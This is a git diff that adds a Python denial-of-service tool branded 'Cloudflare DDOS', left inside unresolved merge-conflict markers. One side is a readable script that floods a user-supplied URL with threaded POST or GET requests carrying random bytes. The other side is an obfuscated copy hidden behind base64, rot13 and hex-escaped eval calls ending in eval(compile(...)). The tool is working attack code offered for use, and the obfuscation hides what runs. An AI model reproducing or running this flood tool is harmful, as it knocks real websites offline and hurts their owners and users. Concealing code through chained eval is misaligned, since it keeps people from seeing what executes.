@@ -4,6 +4,111 @@
 
 
 
+<<<<<<< HEAD
+import threading
+import random 
+import requests,os,sys,time
+
+
+#text colour()
+#creator: CRACKER911181
+
+#Text colour
+#created By Cracker911181
+colouroff="\x1b[00m" #colour off
+
+red="\x1b[91m" #red
+green="\x1b[92m" #green
+yellow="\x1b[93m" #yellow
+blue="\x1b[94m" #blue
+rosy="\x1b[95m" #rosy
+pest="\x1b[96m" #pest
+
+
+
+type = ''
+
+
+
+datas = random._urandom(1490)
+main_url = ''
+
+def check():
+	url = str(input(rosy+"\n\nEnter Your URL: "+colouroff))
+	#url = url.replace('https://','http://')
+
+	global type,main_url
+	x = requests.post(url,data=datas)
+	if x.status_code==200:
+		type = "post"
+		main_url = url
+	else:
+		type = 'get'
+		main_url = url+"?"+str(datas)
+
+
+def req():
+	data = datas
+	try:
+		while True:
+			try:
+				if type=='post':
+					requests.post(main_url,data=data)
+				else:
+					requests.get(main_url)
+				print(red+"requests send")
+			except:
+				pass
+	
+	except:
+		pass
+	
+
+def mainer():
+	
+	"""threading.Thread(target=req).start()"""
+	exec(mainer.__doc__)
+
+
+
+def main():
+	try:
+		check()
+		thred = int(input(rosy+"\nEnter Thread Amount: "+colouroff))
+		for _ in range(thred - 1):
+			mainer.__doc__=mainer.__doc__+"\nthreading.Thread(target=req).start()"
+		os.system("clear")
+		print("\n\n\tTo stop Ddos press (ct + z)\n\n")
+		mainer()
+	
+	except ValueError:
+		print(e)
+		print(red+"\n\n\t\tSomething went wrong!")
+		input(blue+"\n\n       Press Enter To Back Previous Menu ")
+
+
+
+
+while True:
+	os.system('clear')
+	print(blue+f"""
+   ____                _                _____           _
+  / ___|_ __ __ _  ___| | _____ _ __   |_   _|__   ___ | |
+ """+blue+"""| |   | '__/ _` |/ __| |/ / _ \ '__|____| |/ _ \ / _ \| |
+ """+pest+"""| |___| | | (_| | (__|   <  __/ | |_____| | (_) | (_) | |
+  \____|_|  \__,_|\___|_|\_\___|_|       |_|\___/ \___/|_|\n\n """+green+"""             Crack Your World, If You Can\n\n\t         """+blue+"""[★] Cloudflare DDOS [★] \n"""+green+""" ========================================================="""+colouroff)
+	
+	chose=str(input(pest+"\n\n\t\t1.DDOS Attack\n\t\t"+red+"00.Back To Home\n\n"+rosy+"Enter Your Option: "))
+	
+	if chose == "1":
+		
+		main()
+		break
+	
+		
+	elif chose == "00":
+		break
+=======
 import base64, codecs
 magic = 'aW1wb3J0IHRocmVhZGluZwppbXBvcnQgcmFuZG9tIAppbXBvcnQgcmVxdWVzdHMsb3Msc3lzLHRpbWUKCgojdGV4dCBjb2xvdXIoKQojY3JlYXRvcjogQ1JBQ0tFUjkxMTE4MQoKI1RleHQgY29sb3VyCiNjcmVhdGVkIEJ5IENyYWNrZXI5MTExODEKY29sb3Vyb2ZmPSJceDFiWzAwbSIgI2NvbG91ciBvZmYKCnJlZD0iXHgxYls5MW0iICNyZWQKZ3JlZW49Ilx4MWJbOTJtIiAjZ3JlZW4KeWVsbG93PSJceDFiWzkzbSIgI3llbGxvdwpibHVlPSJceDFiWzk0bSIgI2JsdWUKcm9zeT0iXHgxYls5NW0iICNyb3N5CnBlc3Q9Ilx4MWJbOTZtIiAjcGVzdAoKCgp0eXBlID0gJycKCgoKZGF0YXMgPSByYW5kb20uX3VyYW5kb20oMTQ5MCkKbWFpbl91cmwgPSAnJwoKZGVmIGNoZWNrKCk6Cgl1cmwgPSBzdHIoaW5wdXQocm9zeSsiXG5cbkVudGVyIFlvdXIgVVJMOiAiK2NvbG91cm9mZikpCgkjdXJsID0gdXJsLnJlcGxhY2UoJ2h0dHBzOi8vJywnaHR0cDovLycpCgoJZ2xvYmFsIHR5cGUsbWFpbl91cmwKCXggPSByZXF1ZXN0cy5wb3N0KHVybCxkYXR'
 love = 'uCJEuqTSmXDbWnJLtrP5mqTS0qKAsL29xMG09ZwNjBtbWPKE5pTHtCFNvpT9mqPVXPDygLJyhK3IloPN9VUIloNbWMJkmMGbXPDy0rKOyVQ0tW2qyqPpXPDygLJyhK3IloPN9VUIloPfvClVep3ElXTEuqTSmXDbXPzEyMvOlMKRbXGbXPJEuqTRtCFOxLKEupjbWqUW5BtbWPKqbnJkyVSElqJH6PtxWPKElrGbXPDxWPJyzVUE5pTH9CFqjo3A0WmbXPDxWPDylMKS1MKA0pl5jo3A0XT1unJ5sqKWfYTEuqTR9MTS0LFxXPDxWPJIfp2H6PtxWPDxWpzIkqJImqUZhM2I0XT1unJ5sqKWfXDbWPDxWpUWcoaDbpzIxXlWlMKS1MKA0plOmMJ5xVvxXPDxWMKuwMKO0BtbWPDxWpTSmpjbWPtyyrTAypUD6PtxWpTSmpjbWPtcxMJLtoJScozIlXPx6PtxXPFVvVaEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CKWypFxhp3EupaDbXFVvVtbWMKuyLlugLJyhMKVhK19xo2AsKlxXPtbXMTIzVT1unJ4bXGbXPKElrGbXPDywnTIwnltcPtxWqTulMJDtCFOcoaDbnJ5jqKDbpz9mrFfvKT5SoaEypvOHnUWyLJDtDJ1iqJ50BvNvX2AioT91pz9zMvxcPtxWMz9lVS8tnJ4tpz'
@@ -12,3 +117,4 @@ destiny = '198VUjiVS8tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
